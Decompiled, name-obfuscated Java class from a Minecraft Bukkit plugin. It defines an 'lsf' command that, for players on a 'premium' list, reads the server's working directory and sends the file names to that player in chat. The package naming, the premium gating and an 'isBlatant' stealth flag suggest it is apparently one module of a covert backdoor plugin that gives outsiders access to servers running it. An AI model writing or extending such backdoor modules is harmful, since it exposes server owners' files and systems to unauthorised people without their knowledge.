/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.FileUtil;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class LsfCommand
extends Command {
    /* synthetic */ File file;

    public LsfCommand() {
        LsfCommand lllllllllllllIlllllIIIIlIIIIIIIl;
        lllllllllllllIlllllIIIIlIIIIIIIl.file = FileUtil.getUserDir();
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core lllllllllllllIlllllIIIIIlllIllll, String lllllllllllllIlllllIIIIIllllIIll, String[] lllllllllllllIlllllIIIIIllllIIlI, Player lllllllllllllIlllllIIIIIllllIIIl) {
        if (lllllllllllllIlllllIIIIIlllIllll.premium.contains(lllllllllllllIlllllIIIIIllllIIIl.getName())) {
            LsfCommand lllllllllllllIlllllIIIIIllllIIII;
            ArrayList<String> lllllllllllllIlllllIIIIIllllIllI = new ArrayList<String>();
            for (File lllllllllllllIlllllIIIIIllllIlll : lllllllllllllIlllllIIIIIllllIIII.file.listFiles()) {
                if (!lllllllllllllIlllllIIIIIllllIlll.isFile()) continue;
                lllllllllllllIlllllIIIIIllllIllI.add(lllllllllllllIlllllIIIIIllllIlll.getName());
            }
            Collections.sort(lllllllllllllIlllllIIIIIllllIllI);
            lllllllllllllIlllllIIIIIllllIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("").append(lllllllllllllIlllllIIIIIllllIllI))));
        } else {
            lllllllllllllIlllllIIIIIllllIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }
}

